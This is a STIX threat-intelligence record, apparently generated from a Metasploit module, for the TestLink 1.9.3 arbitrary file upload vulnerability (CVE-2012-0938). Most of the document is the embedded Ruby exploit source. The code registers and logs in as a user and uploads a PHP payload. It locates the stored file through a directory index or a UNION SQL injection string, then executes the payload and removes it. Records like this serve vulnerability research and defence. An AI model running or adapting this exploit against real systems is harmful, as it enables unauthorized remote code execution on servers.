{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9c3a9d9-9d25-4106-9d6f-e40a54e8ab43",
    "created": "2024-08-14T17:07:57.450128Z",
    "modified": "2024-08-14T17:07:57.450133Z",
    "name": "\"TestLink v1.9.3 Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability in TestLink version 1.9.3 or prior. This application has an upload feature that allows any authenticated user to upload arbitrary files to the '/upload_area/nodes_hierarchy/' directory with a randomized file name. The file name can be retrieved from the database using SQL injection.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/testlink_upload_exec.rb",
            "external_id": "testlink_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0938"
        },
        {
            "source_name": "reference",
            "url": "http://itsecuritysolutions.org/2012-08-13-TestLink-1.9.3-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"TestLink v1.9.3 Arbitrary File Upload Vulnerability\",\n        'Description' => %q{\n          This module exploits a vulnerability in TestLink version 1.9.3 or prior.\n          This application has an upload feature that allows any authenticated\n          user to upload arbitrary files to the '/upload_area/nodes_hierarchy/'\n          directory with a randomized file name. The file name can be retrieved from\n          the database using SQL injection.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bcoles' # Discovery and exploit\n        ],\n        'References' => [\n          [ 'CVE', '2012-0938' ],\n          [ 'OSVDB', '85446' ],\n          [ 'EDB', '20500' ],\n          [ 'URL', 'http://itsecuritysolutions.org/2012-08-13-TestLink-1.9.3-multiple-vulnerabilities/' ]\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x00\"\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-08-13',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/testlink-1.9.3/'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    base = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n    peer = \"#{rhost}:#{rport}\"\n\n    # retrieve software version from login page\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, \"login.php\")\n      })\n\n      return Exploit::CheckCode::Unknown if res.nil?\n\n      if res\n        if res.code == 200\n          if res.body =~ /<p><img alt=\"Company logo\" title=\"logo\" style=\"width: 115px; height: 53px;\"\\s+src=\"[^\"]+\" \\/>\\s+<br \\/>TestLink 1\\.9\\.3/\n            return Exploit::CheckCode::Appears\n          end\n        end\n      end\n\n      return Exploit::CheckCode::Detected if res and res.body =~ /TestLink project <a href=\"http:\\/\\/testlink\\.sourceforge\\.net\\/docs\\/testLink\\.php\">Home<\\/a><br \\/>/\n\n      return Exploit::CheckCode::Safe\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def upload(base, fname, file)\n    boundary = \"----WebKitFormBoundary#{rand_text_alphanumeric(10)}\"\n    data_post = \"--#{boundary}\\r\\n\"\n    data_post << \"Content-Disposition: form-data; name=\\\"uploadedFile\\\"; filename=\\\"#{fname}\\\"\\r\\n\"\n    data_post << \"Content-Type: text/php\\r\\n\"\n    data_post << \"\\r\\n\"\n    data_post << file\n    data_post << \"\\r\\n\"\n    data_post << \"--#{boundary}\\r\\n\"\n    data_post << \"Content-Disposition: form-data; name=\\\"MAX_FILE_SIZE\\\"\\r\\n\"\n    data_post << \"\\r\\n1048576\\r\\n\"\n    data_post << \"--#{boundary}\\r\\n\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{base}lib/attachments/attachmentupload.php\",\n      'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n      'data' => data_post,\n      'cookie' => datastore['COOKIE'],\n    })\n\n    return res\n  end\n\n  def register(base, user, pass)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{base}firstLogin.php\",\n      'data' => \"login=#{user}&password=#{pass}&password2=#{pass}&firstName=#{user}&lastName=#{user}&email=#{user}%40#{user}.tld&doEditUser=Add+User+Data\",\n    })\n\n    return res\n  end\n\n  def login(base, user, pass)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{base}login.php\",\n      'data' => \"reqURI=&destination=&tl_login=#{user}&tl_password=#{pass}&login_submit=Login\",\n      'cookie' => datastore['COOKIE'],\n    })\n\n    return res\n  end\n\n  def on_new_session(client)\n    print_warning(\"Deleting #{@token}.php\")\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(\"#{@token}.php\")\n    else\n      client.shell_command_token(\"rm #{@token}.php\")\n    end\n  end\n\n  def exploit\n    base = normalize_uri(target_uri.path)\n    base << '/' if base[-1, 1] != '/'\n\n    datastore['COOKIE'] = \"PHPSESSID=\" + rand_text_alpha_lower(26) + \";\"\n\n    # register an account\n    user = rand_text_alphanumeric(rand(10) + 6)\n    print_status(\"Registering user (#{user})\")\n    res = register(base, user, user)\n    if res and res.code == 200 and res.body =~ /\\<html\\>\\<head\\>\\<\\/head\\>\\<body\\>\\<script type='text\\/javascript'\\>location\\.href=/\n      print_good(\"Registered successfully\")\n    else\n      print_error(\"Registration failed\")\n      return\n    end\n\n    # login\n    print_status(\"Authenticating user (#{user})\")\n    res = login(base, user, user)\n    if res and res.code == 200 and res.body =~ /\\<html\\>\\<head\\>\\<\\/head\\>\\<body\\>\\<script type='text\\/javascript'\\>location\\.href=/\n      print_good(\"Authenticated successfully\")\n    else\n      print_error(\"Authentication failed\")\n      return\n    end\n\n    # set id and table name\n    id = rand(1000) + 1\n    table = 'nodes_hierarchy'\n    print_status(\"Setting id (#{id}) and table name (#{table})\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, \"lib/attachments/attachmentupload.php\") + \"?id=#{id}&tableName=#{table}\",\n        'cookie' => datastore['COOKIE'],\n      })\n      if res and res.code == 200\n        print_good(\"Setting id and table name successfully\")\n      else\n        print_error(\"Setting id and table name failed\")\n        return\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Connection failed\")\n      return\n    end\n\n    # upload PHP payload to ./upload_area/nodes_hierarchy/[id]/\n    print_status(\"Uploading PHP payload (#{payload.encoded.length.to_s} bytes)\")\n    fname = rand_text_alphanumeric(rand(10) + 6) + '.php'\n    php = %Q|<?php #{payload.encoded} ?>|\n    begin\n      res = upload(base, fname, php)\n      if res and res.code == 200 and res.body =~ /<p>File uploaded<\\/p>/\n        print_good(\"File uploaded successfully\")\n      else\n        print_error(\"Uploading PHP payload failed\")\n        return\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Connection failed\")\n      return\n    end\n\n    # attempt to retrieve real file name from directory index\n    print_status(\"Retrieving real file name from directory index.\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, \"upload_area\", table, id)\n      })\n      if res and res.code == 200 and res.body =~ /\\b([a-f0-9]+)\\.php/\n        @token = $1\n        print_good(\"Successfully retrieved file name (#{@token})\")\n      else\n        print_error(\"Could not retrieve file name from directory index.\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Connection failed\")\n      return\n    end\n\n    # attempt to retrieve real file name from the database\n    if @token.nil?\n      print_status(\"Retrieving real file name from the database.\")\n      sqli = normalize_uri(base, \"lib/ajax/gettprojectnodes.php\") + \"?root_node=-1+union+select+file_path,2,3,4,5,6+FROM+attachments+WHERE+file_name='#{fname}'--\"\n      begin\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => sqli,\n          'cookie' => datastore['COOKIE'],\n        })\n        if res and res.code == 200 and res.body =~ /\\b([a-f0-9]+)\\.php/\n          @token = $1\n          print_good(\"Successfully retrieved file name (#{@token})\")\n        else\n          print_error(\"Could not retrieve file name from the database.\")\n          return\n        end\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        print_error(\"Connection failed\")\n        return\n      end\n    end\n\n    # retrieve and execute PHP payload\n    print_status(\"Executing payload (#{@token}.php)\")\n    begin\n      send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, \"upload_area\", \"nodes_hierarchy\", id, \"#{@token}.php\")\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Connection failed\")\n      return\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-13",
    "x_mitre_platforms": [
        "php'"
    ]
}